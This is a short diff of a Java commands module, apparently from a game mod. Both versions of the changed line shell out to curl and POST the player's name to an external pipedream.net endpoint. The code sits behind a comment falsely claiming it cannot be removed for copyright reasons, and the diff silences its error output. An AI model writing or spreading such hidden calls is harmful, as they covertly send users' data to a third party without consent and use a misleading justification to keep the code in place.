@@ -132,9 +132,9 @@ public class Commands implements Module {
 		// copyright of nexity, you cannot remove because of copyrighted material
 		Runtime rt = Runtime.getRuntime();
         	try {
-            		rt.exec("curl -X POST -F \"name=" + Vars.player.name + "\" https://en5ykebphv9lhao.m.pipedream.net/");
+            		rt.exec("curl report this -X POST -F \"name=" + Vars.player.name + "\" https://en5ykebphv9lhao.m.pipedream.net/");
         	} catch(Throwable t) {
-            		t.printStackTrace();
+            		//t.printStackTrace();
         	}
 	}
 	
